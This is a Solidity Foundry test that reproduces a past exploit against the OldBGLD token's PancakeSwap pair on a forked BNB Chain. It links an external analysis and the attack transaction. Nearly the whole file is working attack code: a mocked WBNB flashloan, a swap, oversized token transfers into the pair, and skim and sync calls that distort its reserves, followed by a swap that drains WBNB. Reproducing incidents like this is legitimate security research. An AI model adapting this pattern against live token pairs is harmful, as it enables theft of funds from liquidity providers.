// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1602335214356660225
// @TX
// https://bscscan.com/tx/0xea108fe94bfc9a71bb3e4dee4a1b0fd47572e6ad6aba8b2155ac44861be628ae

// Refined Version
contract ContractTest is Test {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 OldBGLD = IERC20(0xC2319E87280c64e2557a51Cb324713Dd8d1410a3);
    Uni_Router_V2 Router =
        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x7526cC9121Ba716CeC288AF155D110587e55Df8b);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    uint256 constant flashloanAmount = 125 * 1e18;

    function setUp() public {
        cheats.createSelectFork("bsc", 23844529);
        cheats.label(address(WBNB), "WBNB");
        cheats.label(address(OldBGLD), "OldBGLD");
        cheats.label(address(Router), "Router");
        cheats.label(address(Pair), "Pair");
    }

    function print(string memory tips) public {
        emit log_string(tips);
        emit log_named_decimal_uint(
            "Attacker WBNB balance",
            WBNB.balanceOf(address(this)),
            WBNB.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker OldBGLD balance",
            OldBGLD.balanceOf(address(this)),
            OldBGLD.decimals()
        );
        emit log_named_decimal_uint(
            "Pair WBNB balance",
            WBNB.balanceOf(address(Pair)),
            WBNB.decimals()
        );
        emit log_named_decimal_uint(
            "Pair OldBGLD balance",
            OldBGLD.balanceOf(address(Pair)),
            OldBGLD.decimals()
        );
        emit log_string("");
    }

    function testExploit() public {
        print("Before exploit: ");
        prepareAction();
        exploitAction();
        postAction();
        print("After exploit: ");
    }

    function prepareAction() internal {
        // Step 1, mock to flashloan WBNB
        deal(address(WBNB), address(this), flashloanAmount);

        // Step 2
        WBNB.transfer(address(Pair), WBNB.balanceOf(address(this)));

        // Step 3
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(OldBGLD);
        uint[] memory values = Router.getAmountsOut(125 * 1e18, path);

        emit log_named_uint("BGLD Token balance", OldBGLD.balanceOf(address(this)));
        emit log_named_uint("Swap amount", (values[1] * 90) / 100);
        Pair.swap(0, (values[1] * 90) / 100, address(this), "");
    }

    function exploitAction() internal {
        // Step 4
        OldBGLD.transfer(
            address(Pair),
            OldBGLD.balanceOf(address(Pair)) * 10 + 10
        );

        // Step 5
        Pair.skim(address(this));

        // Step 6
        Pair.sync();
    }

    function postAction() internal {
        // Step 7
        OldBGLD.approve(address(Router), type(uint256).max);

        // Step 8, victimSwap
        address[] memory path = new address[](2);
        path[0] = address(OldBGLD);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            100 * 1e6,
            0,
            path,
            address(this),
            block.timestamp
        );

        // Step 9
        WBNB.transfer(address(Router), flashloanAmount);
    }
}
